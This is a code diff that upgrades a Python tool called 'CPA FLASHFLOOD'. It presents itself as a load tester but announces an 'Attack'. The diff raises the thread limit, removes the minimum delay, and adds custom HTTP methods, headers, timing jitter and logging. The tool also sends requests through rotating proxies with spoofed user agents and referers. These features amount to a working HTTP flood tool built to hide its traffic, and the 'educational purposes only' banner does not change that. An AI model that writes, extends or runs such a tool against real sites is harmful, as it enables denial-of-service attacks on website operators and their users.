@@ -7,6 +7,8 @@ import requests
 import time
 import getopt
 import urllib.parse
+import json
+import datetime
 from urllib.parse import urlparse
 from threading import Thread, Event
 
@@ -23,7 +25,7 @@ class Colors:
     DIM = '\033[2m'
     END = '\033[0m'
 
-VERSION = (0, 1, 5)
+VERSION = (0, 2, 0)
 __version__ = '%d.%d.%d' % VERSION[0:3]
 
 if sys.version_info[0:2] < (3, 5):
@@ -44,6 +46,7 @@ BANNER = f"""
 proxy_file = 'proxy.txt'
 ua_file = 'user-agents.txt'
 ref_file = 'referers.txt'
+log_file = 'flashflood.log'
 
 ex = Event()
 ips = []
@@ -60,16 +63,26 @@ failed_requests = 0
 lock = threading.Lock()
 start_time = 0
 use_proxy = True
+method = 'GET'
+custom_headers = {}
+use_jitter = False
+jitter_min = 0.5
+jitter_max = 1.5
+save_log = False
+log_data = []
 
 def main(argv):
-    global use_proxy
+    global use_proxy, method, custom_headers, use_jitter, jitter_min, jitter_max, save_log
+    
     print(BANNER)
-    print(f"{Colors.CYAN}🚀 CPA FLASHFLOOD v{__version__} - HTTP Load Tester{Colors.END}")
+    print(f"{Colors.CYAN}🚀 CPA FLASHFLOOD v{__version__} - Advanced HTTP Load Tester{Colors.END}")
     print(f"{Colors.YELLOW}⚠️  For educational and testing purposes only!{Colors.END}")
     print(f"{Colors.YELLOW}Use only on websites you own or have permission{Colors.END}\n")
     
     try:
-        opts, args = getopt.getopt(argv, 'hv:t:', ['help', 'url=', 'timeout=', 'threads=', 'delay=', 'no-proxy'])
+        opts, args = getopt.getopt(argv, 'hv:t:X:H:j:l', 
+            ['help', 'url=', 'timeout=', 'threads=', 'delay=', 'no-proxy', 
+             'method=', 'header=', 'jitter=', 'log'])
     except getopt.GetoptError as err:
         print(f"{Colors.RED}✗ Error: {err}{Colors.END}")
         showUsage()
@@ -103,11 +116,11 @@ def main(argv):
         elif opt == '--threads':
             try:
                 arg = int(arg)
-                if arg >= 1 and arg <= 100:
+                if arg >= 1 and arg <= 200:
                     global max_threads
                     max_threads = arg
                 else:
-                    print(f"{Colors.RED}✗ Error: Threads must be between 1-100{Colors.END}")
+                    print(f"{Colors.RED}✗ Error: Threads must be between 1-200{Colors.END}")
                     sys.exit(2)
             except ValueError:
                 print(f"{Colors.RED}✗ Error: Threads must be integer{Colors.END}")
@@ -115,11 +128,11 @@ def main(argv):
         elif opt == '--delay':
             try:
                 arg = float(arg)
-                if arg >= 0.1:
+                if arg >= 0:
                     global request_delay
                     request_delay = arg
                 else:
-                    print(f"{Colors.RED}✗ Error: Delay must be >= 0.1{Colors.END}")
+                    print(f"{Colors.RED}✗ Error: Delay must be >= 0{Colors.END}")
                     sys.exit(2)
             except ValueError:
                 print(f"{Colors.RED}✗ Error: Delay must be number{Colors.END}")
@@ -127,6 +140,35 @@ def main(argv):
         elif opt == '--no-proxy':
             use_proxy = False
             print(f"{Colors.YELLOW}⚠️  Proxy disabled, using direct connection{Colors.END}")
+        elif opt == '--method' or opt == '-X':
+            method = arg.upper()
+            if method not in ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']:
+                print(f"{Colors.RED}✗ Error: Invalid method {method}{Colors.END}")
+                sys.exit(2)
+            print(f"{Colors.CYAN}ℹ Using method: {method}{Colors.END}")
+        elif opt == '--header' or opt == '-H':
+            try:
+                key, value = arg.split(':', 1)
+                custom_headers[key.strip()] = value.strip()
+                print(f"{Colors.CYAN}ℹ Custom header: {key.strip()}: {value.strip()}{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Invalid header format. Use 'Key: Value'{Colors.END}")
+                sys.exit(2)
+        elif opt == '--jitter' or opt == '-j':
+            use_jitter = True
+            try:
+                if ',' in arg:
+                    jitter_min, jitter_max = map(float, arg.split(','))
+                else:
+                    jitter_min = float(arg) * 0.5
+                    jitter_max = float(arg) * 1.5
+                print(f"{Colors.CYAN}ℹ Jitter enabled: {jitter_min}s - {jitter_max}s{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Invalid jitter format. Use 'min,max' or single value{Colors.END}")
+                sys.exit(2)
+        elif opt == '--log' or opt == '-l':
+            save_log = True
+            print(f"{Colors.CYAN}ℹ Logging enabled: {log_file}{Colors.END}")
     
     if not url:
         print(f"{Colors.RED}✗ Error: URL is required!{Colors.END}")
@@ -143,14 +185,20 @@ def parseFiles():
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
     ]
     default_ref = [
         'https://www.google.com/',
         'https://www.bing.com/',
         'https://www.yahoo.com/',
         'https://duckduckgo.com/',
-        'https://www.facebook.com/'
+        'https://www.facebook.com/',
+        'https://www.twitter.com/',
+        'https://www.instagram.com/',
+        'https://www.linkedin.com/'
     ]
     
     ua = default_ua.copy()
@@ -180,7 +228,6 @@ def parseFiles():
             print(f"{Colors.RED}  ✗ Error reading {proxy_file}: {e}{Colors.END}")
             ips = []
     else:
-        # Jika --no-proxy, tidak usah baca proxy sama sekali
         ips = []
         print(f"{Colors.DIM}  ℹ Proxy disabled by --no-proxy flag{Colors.END}")
     
@@ -232,9 +279,20 @@ def parseFiles():
 def testConnection():
     print(f"{Colors.CYAN}🔗 Testing Connection{Colors.END}")
     print(f"{Colors.WHITE}Target URL: {Colors.GREEN}{url}{Colors.END}")
+    print(f"{Colors.WHITE}Method: {Colors.GREEN}{method}{Colors.END}")
+    if custom_headers:
+        print(f"{Colors.WHITE}Custom Headers: {Colors.GREEN}{len(custom_headers)}{Colors.END}")
     
     try:
-        r = requests.get(url, timeout=timeout)
+        if method == 'GET':
+            r = requests.get(url, timeout=timeout)
+        elif method == 'POST':
+            r = requests.post(url, timeout=timeout)
+        elif method == 'HEAD':
+            r = requests.head(url, timeout=timeout)
+        else:
+            r = requests.request(method, url, timeout=timeout)
+            
         print(f"{Colors.WHITE}Status: {Colors.GREEN}{r.status_code} {Colors.WHITE}| Size: {Colors.GREEN}{len(r.content)} bytes{Colors.END}")
         print(f"{Colors.GREEN}✅ Connection successful!{Colors.END}\n")
         startTesting()
@@ -256,6 +314,12 @@ def request_testing(index):
     
     while not ex.is_set():
         try:
+            # Calculate jitter delay
+            if use_jitter:
+                current_delay = random.uniform(jitter_min, jitter_max)
+            else:
+                current_delay = request_delay
+            
             # Pilih proxy
             proxy = None
             proxy_str = 'Direct'
@@ -279,12 +343,21 @@ def request_testing(index):
                 'Connection': 'keep-alive'
             }
             
+            # Add custom headers
+            if custom_headers:
+                headers.update(custom_headers)
+            
             # Kirim request
             start_time_req = time.time()
-            if proxy:
+            
+            if method == 'GET':
                 r = requests.get(url, headers=headers, proxies=proxy, timeout=timeout)
+            elif method == 'POST':
+                r = requests.post(url, headers=headers, proxies=proxy, timeout=timeout)
+            elif method == 'HEAD':
+                r = requests.head(url, headers=headers, proxies=proxy, timeout=timeout)
             else:
-                r = requests.get(url, headers=headers, timeout=timeout)
+                r = requests.request(method, url, headers=headers, proxies=proxy, timeout=timeout)
             
             response_time = time.time() - start_time_req
             
@@ -297,29 +370,96 @@ def request_testing(index):
                 else:
                     failed_requests += 1
                     status_color = Colors.YELLOW
+                
+                # Log data
+                if save_log:
+                    log_entry = {
+                        'timestamp': datetime.datetime.now().isoformat(),
+                        'thread': index,
+                        'method': method,
+                        'url': url,
+                        'status': r.status_code,
+                        'response_time': round(response_time, 3),
+                        'proxy': proxy_str,
+                        'size': len(r.content)
+                    }
+                    log_data.append(log_entry)
             
             # Log hasil
-            print(f"{status_color}[{index:>2}] {r.status_code:>3} | {response_time:>5.2f}s | {proxy_str}{Colors.END}")
+            delay_info = f" | delay: {current_delay:.2f}s" if use_jitter else ""
+            print(f"{status_color}[{index:>2}] {r.status_code:>3} | {response_time:>5.2f}s | {proxy_str}{delay_info}{Colors.END}")
             
-            time.sleep(request_delay)
+            # Jitter delay
+            if current_delay > 0:
+                time.sleep(current_delay)
             
         except requests.exceptions.ProxyError:
             print(f"{Colors.RED}[{index:>2}] PROXY ERROR | {proxy_list[proxy_index-1] if proxy_list else 'None'}{Colors.END}")
+            with lock:
+                if save_log:
+                    log_entry = {
+                        'timestamp': datetime.datetime.now().isoformat(),
+                        'thread': index,
+                        'method': method,
+                        'url': url,
+                        'status': 'PROXY_ERROR',
+                        'response_time': 0,
+                        'proxy': proxy_list[proxy_index-1] if proxy_list else 'None',
+                        'size': 0
+                    }
+                    log_data.append(log_entry)
             time.sleep(0.5)
         except requests.exceptions.Timeout:
             print(f"{Colors.YELLOW}[{index:>2}] TIMEOUT | {timeout}s{Colors.END}")
             with lock:
                 total_requests += 1
                 failed_requests += 1
+                if save_log:
+                    log_entry = {
+                        'timestamp': datetime.datetime.now().isoformat(),
+                        'thread': index,
+                        'method': method,
+                        'url': url,
+                        'status': 'TIMEOUT',
+                        'response_time': timeout,
+                        'proxy': proxy_str,
+                        'size': 0
+                    }
+                    log_data.append(log_entry)
             time.sleep(1)
         except requests.exceptions.ConnectionError:
             print(f"{Colors.YELLOW}[{index:>2}] CONNECTION ERROR{Colors.END}")
             with lock:
                 total_requests += 1
                 failed_requests += 1
+                if save_log:
+                    log_entry = {
+                        'timestamp': datetime.datetime.now().isoformat(),
+                        'thread': index,
+                        'method': method,
+                        'url': url,
+                        'status': 'CONNECTION_ERROR',
+                        'response_time': 0,
+                        'proxy': proxy_str,
+                        'size': 0
+                    }
+                    log_data.append(log_entry)
             time.sleep(1)
         except Exception as e:
             print(f"{Colors.RED}[{index:>2}] ERROR: {str(e)[:30]}{Colors.END}")
+            with lock:
+                if save_log:
+                    log_entry = {
+                        'timestamp': datetime.datetime.now().isoformat(),
+                        'thread': index,
+                        'method': method,
+                        'url': url,
+                        'status': str(e)[:50],
+                        'response_time': 0,
+                        'proxy': proxy_str,
+                        'size': 0
+                    }
+                    log_data.append(log_entry)
             time.sleep(1)
 
 def startTesting():
@@ -329,7 +469,14 @@ def startTesting():
     proxy_status = f"{len(ips)} proxies" if ips and use_proxy else "Direct connection"
     print(f"{Colors.GREEN}🚀 Starting FLASHFLOOD Attack{Colors.END}")
     print(f"{Colors.WHITE}Threads: {Colors.GREEN}{max_threads}{Colors.WHITE} | Timeout: {Colors.GREEN}{timeout}s{Colors.WHITE} | Delay: {Colors.GREEN}{request_delay}s{Colors.END}")
+    if use_jitter:
+        print(f"{Colors.WHITE}Jitter: {Colors.GREEN}{jitter_min}s - {jitter_max}s{Colors.END}")
+    print(f"{Colors.WHITE}Method: {Colors.GREEN}{method}{Colors.END}")
     print(f"{Colors.WHITE}Proxy: {Colors.GREEN}{proxy_status}{Colors.END}")
+    if custom_headers:
+        print(f"{Colors.WHITE}Custom Headers: {Colors.GREEN}{len(custom_headers)}{Colors.END}")
+    if save_log:
+        print(f"{Colors.WHITE}Log: {Colors.GREEN}Enabled ({log_file}){Colors.END}")
     print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}\n")
     
     threads = []
@@ -367,6 +514,16 @@ def startTesting():
         for t in threads:
             t.join(timeout=2)
         
+        # Save log if enabled
+        if save_log and log_data:
+            try:
+                with open(log_file, 'w') as f:
+                    json.dump(log_data, f, indent=2)
+                print(f"{Colors.GREEN}✅ Log saved to {log_file} ({len(log_data)} entries){Colors.END}")
+            except Exception as e:
+                print(f"{Colors.RED}❌ Error saving log: {e}{Colors.END}")
+        
+        # Final stats
         elapsed = time.time() - start_time
         print(f"\n{Colors.CYAN}📊 FINAL STATISTICS{Colors.END}")
         print(f"{Colors.WHITE}Total Time    : {Colors.GREEN}{elapsed:.1f}s{Colors.END}")
@@ -382,7 +539,7 @@ def startTesting():
 
 def showUsage():
     print(f"""
-{Colors.CYAN}CPA FLASHFLOOD v{__version__} - HTTP Request Tester & Load Testing Tool{Colors.END}
+{Colors.CYAN}CPA FLASHFLOOD v{__version__} - Advanced HTTP Load Testing Tool{Colors.END}
 
 {Colors.GREEN}USAGE:{Colors.END}
     python script.py {Colors.CYAN}--url{Colors.END} <URL> {Colors.DIM}[OPTIONS]{Colors.END}
@@ -390,15 +547,30 @@ def showUsage():
 {Colors.GREEN}OPTIONS:{Colors.END}
     {Colors.CYAN}-v, --url{Colors.END} <URL>       Target URL {Colors.RED}(required){Colors.END}
     {Colors.CYAN}-t, --timeout{Colors.END} <SEC>   Timeout (default: 10)
-    {Colors.CYAN}--threads{Colors.END} <NUM>       Threads (default: 20, max: 100)
+    {Colors.CYAN}--threads{Colors.END} <NUM>       Threads (default: 20, max: 200)
     {Colors.CYAN}--delay{Colors.END} <SEC>         Delay between requests (default: 1.0)
     {Colors.CYAN}--no-proxy{Colors.END}            Disable proxy
-    {Colors.CYAN}-h, --help{Colors.END}            Help
+    {Colors.CYAN}-X, --method{Colors.END} <M>      HTTP method (GET, POST, PUT, DELETE, etc.)
+    {Colors.CYAN}-H, --header{Colors.END} <H>      Custom header (format: "Key: Value")
+    {Colors.CYAN}-j, --jitter{Colors.END} <V>      Random delay (format: "min,max" or single value)
+    {Colors.CYAN}-l, --log{Colors.END}             Save results to log file
+    {Colors.CYAN}-h, --help{Colors.END}            Show this help
 
 {Colors.GREEN}EXAMPLES:{Colors.END}
-    python script.py --url https://example.com
+    # Basic GET request
     python script.py --url https://example.com --no-proxy
-    python script.py --url https://example.com --threads 50 --delay 0.5
+    
+    # POST request with custom headers
+    python script.py --url https://api.example.com --method POST -H "Content-Type: application/json" --no-proxy
+    
+    # With jitter (random delay 0.5-1.5s)
+    python script.py --url https://example.com --no-proxy --jitter 0.5,1.5 --threads 30
+    
+    # Save results to log
+    python script.py --url https://example.com --no-proxy --log
+    
+    # Full features
+    python script.py --url https://example.com --method POST -H "X-Custom: test" --jitter 0.5,2.0 --threads 50 --delay 0.1 --log --no-proxy
 {Colors.END}""")
 
 if __name__ == '__main__':
